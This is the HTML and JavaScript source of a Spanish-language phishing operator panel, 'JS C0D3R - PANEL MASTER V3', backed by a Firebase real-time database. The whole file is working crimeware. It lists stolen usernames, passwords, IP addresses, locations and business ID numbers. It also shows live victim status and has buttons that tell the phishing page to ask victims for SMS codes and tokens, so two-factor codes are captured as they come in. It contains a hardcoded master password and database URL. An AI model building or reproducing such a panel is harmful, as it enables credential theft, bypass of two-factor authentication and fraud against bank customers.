<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>JS C0D3R - PANEL MASTER V3</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700;900&display=swap" rel="stylesheet">
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
    <style>
        #admin-panel { display: none; }
        #auth-screen { display: flex; }
        .data-label { font-size: 10px; text-transform: uppercase; color: #71717a; font-weight: 700; margin-bottom: 2px; }
        .data-value { font-weight: 600; word-break: break-all; margin-bottom: 8px; line-height: 1.2; }
        .sms-pulse { animation: pulse-yellow 2s infinite; }
        .sms2-pulse { animation: pulse-orange 2s infinite; }
        .token-pulse { animation: pulse-green 2s infinite; }
        @keyframes pulse-yellow { 0%, 100% { background-color: rgba(113, 63, 18, 0.4); } 50% { background-color: rgba(234, 179, 8, 0.3); } }
        @keyframes pulse-orange { 0%, 100% { background-color: rgba(124, 45, 18, 0.4); } 50% { background-color: rgba(249, 115, 22, 0.3); } }
        @keyframes pulse-green { 0%, 100% { background-color: rgba(6, 78, 59, 0.4); } 50% { background-color: rgba(16, 185, 129, 0.3); } }
    </style>
</head>
<body class="bg-black text-gray-100 min-h-screen">

    <!-- Auth Dark -->
    <div id="auth-screen" class="fixed inset-0 bg-black/90 backdrop-blur-md flex items-center justify-center z-[100]">
        <div class="bg-zinc-900 border border-zinc-800 p-8 rounded-2xl shadow-[0_0_30px_rgba(79,70,229,0.2)] w-96 text-center">
            <h2 class="text-2xl font-bold mb-6 text-indigo-400" style="font-family: 'Orbitron', sans-serif;">🔐 Acceso Master</h2>
            <input type="password" id="admin-pass" placeholder="Contraseña" class="w-full p-3 bg-zinc-950 border border-zinc-700 text-white rounded-lg mb-4 focus:ring-2 focus:ring-indigo-500 outline-none">
            <button onclick="verificarAcceso()" class="w-full bg-indigo-600 text-white font-bold py-3 rounded-lg hover:bg-indigo-500 transition shadow-lg shadow-indigo-600/30">Entrar</button>
        </div>
    </div>

    <!-- Main Panel Dark -->
    <div id="admin-panel">
        <nav class="bg-zinc-900 border-b border-zinc-800 p-4 text-white flex justify-between items-center shadow-md sticky top-0 z-50">
            <div class="flex items-center gap-4">
                <h1 class="text-2xl font-black text-indigo-400 tracking-wider" style="font-family: 'Orbitron', sans-serif; text-shadow: 0 0 10px rgba(99, 102, 241, 0.5);">
                    JS C0D3R - MARAÑA PANEL
                </h1>
                <div class="text-xs bg-zinc-950 border border-zinc-800 px-3 py-1 rounded-full text-indigo-300 font-mono">Refresco: <span id="timer">10</span>s</div>
            </div>
            <div class="flex items-center gap-4">
                <div class="bg-zinc-950 border border-zinc-800 px-4 py-2 rounded-lg font-mono text-sm text-indigo-400">TOTAL: <span id="total-count">0</span></div>
                <button onclick="borrarTodo()" class="bg-rose-700 hover:bg-rose-600 px-4 py-2 rounded-lg text-sm font-bold transition shadow-md">Limpiar Todo</button>
                <button onclick="cerrarSesion()" class="bg-zinc-800 hover:bg-zinc-700 px-4 py-2 rounded-lg text-sm font-bold border border-zinc-700 transition">Salir</button>
            </div>
        </nav>

        <div class="w-full p-6">
            <table id="users-table" style="width: 100%; border-collapse: collapse;">
                <tbody id="users-container">
                    <!-- Aquí se insertarán las filas dinámicamente -->
                </tbody>
            </table>
        </div>
    </div>

    <audio id="notif-sound" src="https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3" preload="auto"></audio>

    <script>
        const CLAVE_MAESTRA = "Cabimas2910"; 
        const firebaseConfig = { databaseURL: "https://copendndsn-default-rtdb.firebaseio.com/" };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();
        
        let idsConocidos = new Set(); 
        let primeraCarga = true;

        // Auto-Refresh Logic
        let countTimer = 10;
        setInterval(() => {
            if (--countTimer <= 0) location.reload();
            const timerEl = document.getElementById('timer');
            if (timerEl) timerEl.innerText = countTimer;
        }, 1000);

        function verificarAcceso() {
            if (document.getElementById('admin-pass').value === CLAVE_MAESTRA) {
                sessionStorage.setItem('admin_auth', 'true');
                mostrarPanel();
            }
        }

        function mostrarPanel() {
            document.getElementById('auth-screen').style.display = 'none';
            document.getElementById('admin-panel').style.display = 'block';
            escucharBaseDeDatos();
        }

        if (sessionStorage.getItem('admin_auth') === 'true') mostrarPanel();

        function escucharBaseDeDatos() {
            db.ref('logins').on('value', (snapshot) => {
                const container = document.getElementById('users-container');
                container.innerHTML = '';
                let count = 0;

                snapshot.forEach((child) => {
                    const id = child.key;
                    const data = child.val();
                    if (!data.user) return;
                    count++;

                    if (!idsConocidos.has(id)) {
                        if (!primeraCarga) document.getElementById('notif-sound').play().catch(()=>{});
                        idsConocidos.add(id);
                    }

                    const esEmp = !!data.cedula_juridica;
                    const statusColor = data.online ? 'bg-emerald-500' : 'bg-rose-500';

                    // Lectura de IP y Ubicación
                    const ipCliente = data.ip || 'No registrada';
                    const paisCliente = data.country || data.pais || 'Desconocido';
                    const ciudadCliente = data.city || data.ciudad || 'Desconocida';

                    container.innerHTML += `
    <!-- FILA DEL CLIENTE (MODO OSCURO COMPLETO) -->
    <tr class="bg-zinc-900 shadow-[0_4px_20px_rgba(0,0,0,0.8)] rounded-xl border-l-8 ${esEmp ? 'border-blue-500' : 'border-indigo-500'} border-y border-r border-zinc-800">
        <td class="p-3">
            <div class="flex items-center justify-between gap-4 w-full text-xs">
                
                <!-- 1. LIVE / OFF -->
                <div class="flex items-center gap-1.5 shrink-0">
                    <span class="h-2.5 w-2.5 rounded-full ${statusColor} animate-pulse"></span>
                    <span class="text-[10px] font-bold text-zinc-400">${data.online ? 'LIVE' : 'OFF'}</span>
                </div>

                <!-- 2. TIPO Y ESTADO -->
                <div class="shrink-0">
                    <div class="text-[9px] text-zinc-500 font-bold uppercase">TIPO</div>
                    <div class="font-bold text-gray-100">${esEmp ? 'EMPRESARIAL' : 'PERSONAL'}</div>
                    <div class="text-[9px] font-bold text-indigo-400 uppercase">${data.status || data.step || 'Activo'}</div>
                </div>

                <!-- 3. CÉDULA JURÍDICA (Si aplica) -->
                ${esEmp ? `
                <div class="shrink-0">
                    <div class="text-[9px] text-zinc-500 font-bold uppercase">C. JURÍDICA</div>
                    <div class="font-bold text-blue-400 font-mono">${data.cedula_juridica}</div>
                </div>` : ''}

                <!-- 4. USUARIO -->
                <div class="shrink-0">
                    <div class="text-[9px] text-zinc-500 font-bold uppercase">USUARIO</div>
                    <div class="font-bold text-blue-400 font-mono">${data.user}</div>
                </div>

                <!-- 5. CONTRASEÑA -->
                <div class="shrink-0">
                    <div class="text-[9px] text-zinc-500 font-bold uppercase">CONTRASEÑA</div>
                    <div class="font-bold text-rose-500 font-mono">${data.pass}</div>
                </div>

                <!-- 6. IP -->
                <div class="shrink-0">
                    <div class="text-[9px] text-zinc-500 font-bold uppercase">IP</div>
                    <div class="font-mono text-zinc-300">${ipCliente}</div>
                </div>

                <!-- 7. UBICACIÓN -->
                <div class="shrink-0">
                    <div class="text-[9px] text-zinc-500 font-bold uppercase">UBICACIÓN</div>
                    <div class="font-semibold text-zinc-300">${ciudadCliente}, ${paisCliente}</div>
                </div>

                <!-- 8. CÓDIGOS -->
                <div class="flex items-center gap-2 shrink-0">
                    ${data.sms ? `
                    <div class="px-2.5 py-1 rounded border border-yellow-500/40 bg-yellow-950/40 text-center sms-pulse">
                        <div class="text-[8px] text-yellow-400 font-bold">SMS 1</div>
                        <div class="font-black text-yellow-200 font-mono">${data.sms}</div>
                    </div>` : ''}

                    ${data.sms2 ? `
                    <div class="px-2.5 py-1 rounded border border-orange-500/40 bg-orange-950/40 text-center sms2-pulse">
                        <div class="text-[8px] text-orange-400 font-bold">SMS 2</div>
                        <div class="font-black text-orange-200 font-mono">${data.sms2}</div>
                    </div>` : ''}

                    ${data.token ? `
                    <div class="px-2.5 py-1 rounded border border-emerald-500/40 bg-emerald-950/40 text-center token-pulse">
                        <div class="text-[8px] text-emerald-400 font-bold">TOKEN</div>
                        <div class="font-black text-emerald-200 font-mono">${data.token}</div>
                    </div>` : ''}
                </div>

                <!-- 9. BOTONERA HORIZONTAL -->
                <div class="flex items-center gap-1.5 shrink-0">
                    <button onclick="enviarOrden('${id}', 'pedir_codigo')" class="bg-amber-600 hover:bg-amber-500 text-white text-[9px] px-2.5 py-1.5 rounded font-bold uppercase transition shadow-md">SOLICITAR SMS 1</button>
                    <button onclick="enviarOrden('${id}', 'pedir_codigo2')" class="bg-orange-600 hover:bg-orange-500 text-white text-[9px] px-2.5 py-1.5 rounded font-bold uppercase transition shadow-md">SOLICITAR SMS 2</button>
                    <button onclick="enviarOrden('${id}', 'pedir_token')" class="bg-emerald-600 hover:bg-emerald-500 text-white text-[9px] px-2.5 py-1.5 rounded font-bold uppercase transition shadow-md">SOLICITAR TOKEN</button>
                    <button onclick="enviarOrden('${id}', 'rechazar')" class="bg-zinc-700 hover:bg-zinc-600 text-white text-[9px] px-2.5 py-1.5 rounded font-bold uppercase transition shadow-md">RECHAZAR</button>
                    <button onclick="eliminarCliente('${id}')" class="bg-red-700 hover:bg-red-600 text-white text-[9px] px-2.5 py-1.5 rounded font-bold uppercase transition shadow-md">ELIMINAR</button>
                </div>

            </div>
        </td>
    </tr>
    <!-- SEPARADOR BR ENTRE FILAS -->
    <tr><td colspan="100%"><br></td></tr>
`;
                });
                document.getElementById('total-count').innerText = count;
                primeraCarga = false;
            });
        }

        function enviarOrden(id, accion) {
            let statusText = 'ACTIVO';
            if (accion === 'pedir_codigo') statusText = 'ESPERANDO SMS 1';
            else if (accion === 'pedir_codigo2') statusText = 'ESPERANDO SMS 2';
            else if (accion === 'pedir_token') statusText = 'ESPERANDO TOKEN';
            else if (accion === 'rechazar') statusText = 'RECHAZADO';

            db.ref('logins/' + id).update({ status: statusText });

            db.ref('comandos/' + id).set({ 
                accion: accion, 
                ts: Date.now() 
            });
        }

        function eliminarCliente(id) {
            if (confirm('¿Estás seguro de que deseas eliminar este cliente?')) {
                db.ref('logins/' + id).remove();
                db.ref('comandos/' + id).remove();
            }
        }

        function borrarTodo() { if (confirm('¿Borrar todos los registros?')) db.ref().remove(); }
        function cerrarSesion() { sessionStorage.clear(); location.reload(); }
    </script>
</body>
</html>
